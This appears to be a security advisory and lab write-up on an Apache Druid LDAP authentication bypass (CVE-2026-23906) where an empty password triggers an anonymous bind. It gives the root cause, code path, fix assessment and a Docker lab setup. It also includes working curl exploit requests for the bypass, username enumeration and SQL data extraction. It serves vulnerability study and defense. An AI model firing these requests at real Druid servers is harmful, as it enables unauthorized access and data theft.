# Vulnerability Analysis: CVE-2026-23906

## Apache Druid LDAP Authentication Bypass via Empty Password

---

## 1. Root Cause

**CWE-287: Improper Authentication**

The `LDAPCredentialsValidator.validateCredentials()` method in Apache Druid's `druid-basic-security` extension does not validate that the `username` and `password` parameters are non-empty before performing LDAP operations. When a user submits an HTTP Basic Authentication request with a valid username and an **empty password**, the following sequence occurs:

1. The empty password passes through the HTTP filter chain without validation.
2. The LDAP user lookup (`getLdapUserObject()`) succeeds — it searches for the user by username, independent of the password.
3. The password validation (`validatePassword()`) constructs JNDI properties via `userProperties()`, which sets `Context.SECURITY_CREDENTIALS` to `String.valueOf(password)` — an empty string when `password` is `char[0]`.
4. Per **RFC 4513 Section 5.1.2**, an LDAP simple bind with a DN and an empty password is treated as an **anonymous bind**. Many LDAP servers (including OpenLDAP by default) allow anonymous binds and return success.
5. `validatePassword()` returns `true` because `new InitialDirContext(userProperties(...))` succeeds without throwing `AuthenticationException`.
6. The user is fully authenticated as the target LDAP user with all their privileges.

**The fundamental flaw**: The code trusts the LDAP server's bind success as proof of valid credentials, without accounting for the LDAP protocol's anonymous bind semantics when credentials are empty.

---

## 2. Vulnerable File(s) and Function(s)

### Primary Vulnerable File
**`extensions-core/druid-basic-security/src/main/java/org/apache/druid/security/basic/authentication/validator/LDAPCredentialsValidator.java`**

| Function | Lines | Role |
|---|---|---|
| `validateCredentials()` | 148–212 | Entry point — receives username/password, orchestrates LDAP auth. **Missing empty-value check.** |
| `userProperties()` | 124–130 | Builds JNDI properties. **Line 128**: `String.valueOf(password)` converts `char[0]` to empty string `""`. |
| `validatePassword()` | 253–282 | Performs LDAP bind as user. **Line 260**: `new InitialDirContext(userProperties(...))` succeeds with empty credentials. |

### Call Chain (HTTP Path)

```
HTTP Request: "Authorization: Basic base64(admin:)"
  → BasicHTTPAuthenticator.BasicHTTPAuthenticationFilter.doFilter()  [line 164]
    → BasicAuthUtils.getEncodedUserSecretFromHttpReq()               [line 169] — extracts base64 from "Basic " header
    → BasicAuthUtils.decodeUserSecret()                               [line 178] — base64 decode → "admin:"
    → indexOf(':') split                                              [line 197] — user="admin", password=""
    → credentialsValidator.validateCredentials()                      [line 212] — calls LDAP validator
      → LDAPCredentialsValidator.validateCredentials()                [line 148]
        → new InitialDirContext(bindProperties())                     [line 169] — service account bind (OK)
        → getLdapUserObject()                                         [line 171] — finds "admin" user DN
        → validatePassword(ldapConfig, userDn, char[0])               [line 195] — LDAP bind with empty password
          → userProperties(): SECURITY_CREDENTIALS = ""               [line 128]
          → new InitialDirContext(properties)                         [line 260] — ANONYMOUS BIND → SUCCESS
        → return AuthenticationResult("admin", ...)                   [line 211] — AUTHENTICATED
```

### Secondary Entry Point (JDBC Context)

**`BasicHTTPAuthenticator.authenticateJDBCContext()`** (line 112–122):
- If `password` is empty string `""` (not null), it passes the null check and calls `validateCredentials()` with `"".toCharArray()` → `char[0]`.
- Same vulnerability as the HTTP path.

### Non-Vulnerable Entry Point (gRPC)

**`BasicAuthServerInterceptor.authenticate()`** (line 100–148):
- Uses `decodedUserSecret.split(":")` at line 123, which in Java discards trailing empty strings by default.
- `"admin:".split(":")` returns `["admin"]` (length 1), which fails the `splits.length != 2` check at line 124.
- **The gRPC path is coincidentally NOT exploitable** via empty password, but only due to an accidental property of Java's `String.split()`, not by design.

---

## 3. Triggering Input

### Exact Triggering Request
```
GET /status HTTP/1.1
Host: <druid-router>:8888
Authorization: Basic YWRtaW46
```

Where `YWRtaW46` is `base64("admin:")` — username "admin" with an empty password.

### Equivalent curl command
```bash
curl -u "admin:" http://<druid-router>:8888/status
```

### Requirements for Trigger
1. `druid-basic-security` extension loaded (`druid_extensions_loadList` includes `"druid-basic-security"`)
2. LDAP authenticator configured (`druid_auth_authenticator_ldap_credentialsValidator_type=ldap`)
3. LDAP server permits anonymous binds (default in OpenLDAP)
4. Target username exists in LDAP directory

### Minimum Payload
- **Protocol**: HTTP/1.1 (or HTTPS)
- **Header**: `Authorization: Basic <base64(username:)>`
- **Empty password**: The colon after the username with nothing following it
- **Any valid endpoint**: `/status`, `/druid/v2/sql`, `/druid/indexer/v1/task`, etc.

---

## 4. Attack Scenario

### Step-by-step Exploitation

1. **Reconnaissance**: Attacker identifies an Apache Druid instance with LDAP authentication (e.g., receives `WWW-Authenticate: Basic` in 401 response).

2. **Username Enumeration** (optional): Attacker can enumerate valid LDAP usernames by sending requests with known usernames and empty passwords:
   - Valid username + empty password → `200 OK` (authentication bypass)
   - Invalid username + empty password → `401 Unauthorized` (user not found in LDAP)

3. **Authentication Bypass**: Attacker sends an HTTP request with a valid LDAP username and empty password:
   ```bash
   curl -u "admin:" http://druid:8888/status
   ```

4. **Privilege Escalation**: If the target username is an admin user (e.g., `admin`), the attacker gains full administrative access to the Druid cluster.

5. **Data Exfiltration**: Execute SQL queries against all datasources:
   ```bash
   curl -u "admin:" -X POST http://druid:8888/druid/v2/sql \
     -H "Content-Type: application/json" \
     -d '{"query": "SELECT * FROM sys.segments"}'
   ```

6. **Cluster Administration**: Submit ingestion tasks, modify cluster configuration, manage users and roles.

---

## 5. Impact

### Direct Impact
- **Full authentication bypass** to any LDAP-authenticated user account
- **No credentials required** — only knowledge of a valid username
- **Complete CIA triad compromise**:
  - **Confidentiality**: Read all datasources, system metadata, and configuration
  - **Integrity**: Modify data via ingestion tasks, alter cluster configuration
  - **Availability**: Submit resource-intensive tasks, drop datasources, disrupt cluster

### Authentication Requirements (for PoC)
- **Pre-auth vulnerability**: No authentication needed to exploit
- **Attack vector**: Remote, network-based
- **Default credentials for lab testing**:
  - LDAP admin user: `admin` / `priest`
  - LDAP system user: `druid_system` / `warlock`
  - Other test users: `datasourceOnlyUser`, `stateOnlyUser`, etc. / `helloworld`
- **Auth flow in PoC**: Simply use HTTP Basic Auth with `username:` (empty password) as the `Authorization` header

### Escalation Path

**Auth bypass → Data access → Potential RCE (conditional)**

1. **Data exfiltration** (guaranteed): SQL queries via `/druid/v2/sql` endpoint allow reading all datasources and system tables (`sys.segments`, `sys.servers`, `sys.tasks`, `INFORMATION_SCHEMA.COLUMNS`).

2. **Task submission** (guaranteed with admin role): Submit ingestion tasks via `/druid/indexer/v1/task` to inject or modify data.

3. **User/role manipulation** (guaranteed with admin role): Create new users, modify roles, establish persistent access via Druid's basic security API endpoints (`/druid-ext/basic-security/authentication/db/ldap/users`, `/druid-ext/basic-security/authorization/db/ldapauth/roles`).

4. **RCE via JavaScript** (conditional): If `druid.javascript.enabled=true` (disabled by default), JavaScript-based aggregators, parse specs, or extraction functions can execute arbitrary code. The `JavaScriptConfig` class controls this feature. Not exploitable in default configurations.

---

## 6. Fix Assessment

### The Fix
**Commit**: `79f149d8991802c7f005c2fea0b1d3586780750c`

```java
// Added at beginning of validateCredentials() method body (line 156):
if (username.isEmpty() || password.length == 0) {
    return null;
}
```

### Assessment: Fix is Complete

The fix correctly addresses the root cause by rejecting empty username or empty password **before** any LDAP operations occur. `return null` triggers the authentication failure path (401 response via the HTTP filter).

**Why the fix is adequate:**

1. **Covers the empty password case**: `password.length == 0` catches `char[0]` from `"".toCharArray()`.
2. **Covers the empty username case**: `username.isEmpty()` prevents lookup of empty usernames.
3. **Placed at the correct level**: The check is in `LDAPCredentialsValidator.validateCredentials()`, which is the single entry point for both HTTP and JDBC context authentication paths.
4. **Cannot be bypassed with whitespace**: A password of `" "` (space) has `length == 1`, passes the check, and results in a non-anonymous LDAP bind that will fail unless the actual password is a space.
5. **Cannot be bypassed with null bytes**: A password of `"\0"` has `length == 1`, passes the check. Java JNDI will send the null byte in the LDAP bind, which is not an anonymous bind.
6. **Cache interaction is safe**: The fix runs before the cache check at line 160 (`principal.hasSameCredentials(password, hashGenerator)`), so even cached credentials cannot be exploited with empty passwords.

**Minor observation (not a bypass):** The gRPC path in `BasicAuthServerInterceptor` (line 123) uses `String.split(":")` which coincidentally rejects empty passwords, but this is not by design. The fix in `LDAPCredentialsValidator` would catch it regardless if gRPC's `split` behavior ever changed.

### No Bypass Vectors Identified

---

## 7. Related Attack Surface

### Same Interface — Different Implementation (NOT vulnerable)

**`MetadataStoreCredentialsValidator.validateCredentials()`** (`MetadataStoreCredentialsValidator.java:56-89`):
- Validates against stored PBKDF2 password hashes in metadata storage, not LDAP.
- An empty password would be hashed and compared against the stored hash — it would NOT match unless the actual password is empty.
- **Not vulnerable** to this attack pattern.

### Same Vulnerability Pattern — gRPC Path (Coincidentally Protected)

**`BasicAuthServerInterceptor.authenticate()`** (`BasicAuthServerInterceptor.java:100-148`):
- Line 123: `String[] splits = decodedUserSecret.split(":");` drops trailing empty strings.
- `"admin:".split(":")` → `["admin"]` (length 1) → rejected at line 124.
- **Coincidentally protected** by Java's `String.split()` semantics, not by intentional validation.
- If this code were ever refactored to use `indexOf(':')` like the HTTP path, it would become vulnerable.

### Same Vulnerability Pattern — JDBC Context Path (Protected by Fix)

**`BasicHTTPAuthenticator.authenticateJDBCContext()`** (`BasicHTTPAuthenticator.java:112-122`):
- Checks for null user/password but NOT empty string.
- `"".toCharArray()` → `char[0]` → calls `validateCredentials()` → **protected by the fix**.

### No Other LDAP Bind Locations

Only `LDAPCredentialsValidator.java` performs `InitialDirContext` creation in the entire codebase. The service account bind at line 169 uses configured credentials (not user-controlled).

---

## 8. Build System & Lab Requirements

### Build System
- **Build tool**: Apache Maven (multi-module)
- **Root POM**: `org.apache.druid:druid:35.0.0`
- **Vulnerable module**: `extensions-core/druid-basic-security` (`org.apache.druid.extensions:druid-basic-security`)
- **JDK**: JDK 17 required
- **NOTE**: Building from source is NOT recommended for lab. Use the official Docker image `apache/druid:35.0.0`.

### Build Commands (if building from source)
```bash
# Full build (slow, ~30 min)
mvn clean install -DskipTests -Pdist

# Build only the vulnerable module
cd extensions-core/druid-basic-security
mvn clean package -DskipTests
```

### Dependencies (for Docker lab — RECOMMENDED approach)
| Service | Image | Purpose |
|---|---|---|
| Apache Druid 35.0.0 | `apache/druid:35.0.0` | Vulnerable application (router, coordinator, broker, historical, middlemanager, overlord) |
| OpenLDAP | `osixia/openldap:1.4.0` | LDAP server with anonymous bind enabled (default) |
| PostgreSQL | `postgres:latest` | Druid metadata storage |
| ZooKeeper | `zookeeper:3.5.10` | Druid coordination |

### Runtime Requirements

**1. OpenLDAP Server**
- Image: `osixia/openldap:1.4.0`
- Must allow anonymous binds (default behavior — no special config needed)
- Bootstrap LDIF to create test users (see `integration-tests/docker/ldap-configs/bootstrap.ldif`)
- Minimum users needed: `uid=admin,ou=Users,dc=example,dc=org` with password `priest`
- Volume mount: `./ldap-configs:/container/service/slapd/assets/config/bootstrap/ldif/custom`
- Command: `--copy-service`

**2. Druid Configuration (environment variables)**
```env
druid_extensions_loadList=["druid-basic-security","postgresql-metadata-storage"]
druid_auth_authenticatorChain=["ldap"]
druid_auth_authenticator_ldap_type=basic
druid_auth_authenticator_ldap_credentialsValidator_type=ldap
druid_auth_authenticator_ldap_credentialsValidator_url=ldap://openldap:389
druid_auth_authenticator_ldap_credentialsValidator_bindUser=cn=admin,dc=example,dc=org
druid_auth_authenticator_ldap_credentialsValidator_bindPassword=admin
druid_auth_authenticator_ldap_credentialsValidator_baseDn=ou=Users,dc=example,dc=org
druid_auth_authenticator_ldap_credentialsValidator_userSearch=(&(uid=%s)(objectClass=inetOrgPerson))
druid_auth_authenticator_ldap_credentialsValidator_userAttribute=uid
druid_auth_authenticator_ldap_authorizerName=ldapauth
druid_auth_authenticator_ldap_initialAdminPassword=priest
druid_auth_authenticator_ldap_initialInternalClientPassword=warlock
druid_auth_authorizer_ldapauth_type=basic
druid_auth_authorizer_ldapauth_initialAdminUser=admin
druid_auth_authorizer_ldapauth_initialAdminRole=admin
druid_auth_authorizer_ldapauth_roleProvider_type=ldap
druid_auth_authorizers=["ldapauth"]
druid_escalator_type=basic
druid_escalator_internalClientUsername=druid_system
druid_escalator_internalClientPassword=warlock
druid_escalator_authorizerName=ldapauth
```

**3. PostgreSQL**
- Image: `postgres:latest`
- Environment: `POSTGRES_PASSWORD=FoolishPassword`, `POSTGRES_USER=druid`, `POSTGRES_DB=druid`
- Druid connection: `jdbc:postgresql://postgres:5432/druid`

**4. ZooKeeper**
- Image: `zookeeper:3.5.10`
- Environment: `ZOO_MY_ID=1`

**5. Network Setup**
- All services must be on the same Docker network
- Key ports: Router on 8888, Broker on 8082, Coordinator on 8081
- OpenLDAP on port 389 (internal), optionally exposed on 8389 (external)

### LDAP Bootstrap Users (from bootstrap.ldif)
| DN | UID | Password | Role |
|---|---|---|---|
| `uid=admin,ou=Users,dc=example,dc=org` | admin | priest | Admin |
| `uid=druid_system,ou=Users,dc=example,dc=org` | druid_system | warlock | System |
| `uid=datasourceOnlyUser,ou=Users,dc=example,dc=org` | datasourceOnlyUser | helloworld | Limited |

### Recommended Lab Architecture
```
┌──────────────────────────────────────────────────────┐
│                   Docker Network                      │
│                                                       │
│  ┌───────────┐  ┌───────────┐  ┌──────────────────┐ │
│  │ PostgreSQL │  │ ZooKeeper │  │    OpenLDAP      │ │
│  │  :5432     │  │  :2181    │  │  :389            │ │
│  └─────┬─────┘  └─────┬─────┘  │  anon bind: yes  │ │
│        │               │        └────────┬─────────┘ │
│        │               │                 │            │
│  ┌─────┴───────────────┴─────────────────┴─────────┐ │
│  │         Druid Router (apache/druid:35.0.0)      │ │
│  │         Port 8888 (HTTP)                         │ │
│  │         LDAP auth configured                     │ │
│  │         + Coordinator, Broker, Historical, etc.  │ │
│  └──────────────────────────────────────────────────┘ │
│                         ↑                              │
│                    Attack vector:                      │
│            curl -u "admin:" :8888/status               │
└──────────────────────────────────────────────────────┘
```

### PoC Verification Steps
1. **Confirm normal auth works**: `curl -u admin:priest http://router:8888/status` → 200 OK
2. **Confirm wrong password fails**: `curl -u admin:wrongpw http://router:8888/status` → 401
3. **Exploit (empty password)**: `curl -u "admin:" http://router:8888/status` → 200 OK (BYPASS!)
4. **Demonstrate data access**: `curl -u "admin:" -X POST http://router:8888/druid/v2/sql -H "Content-Type: application/json" -d '{"query":"SELECT * FROM INFORMATION_SCHEMA.SCHEMATA"}'` → SQL results

### Lab Simplification Notes
- For a minimal lab, a single Druid node in `micro-quickstart` mode can be used, but LDAP auth requires at least: ZooKeeper + PostgreSQL + OpenLDAP + Druid Router
- The official `apache/druid:35.0.0` Docker image includes all extensions including `druid-basic-security`
- OpenLDAP's `osixia/openldap:1.4.0` allows anonymous binds by default — no special configuration needed
- The PoC only needs to hit the Router's HTTP endpoint (port 8888)
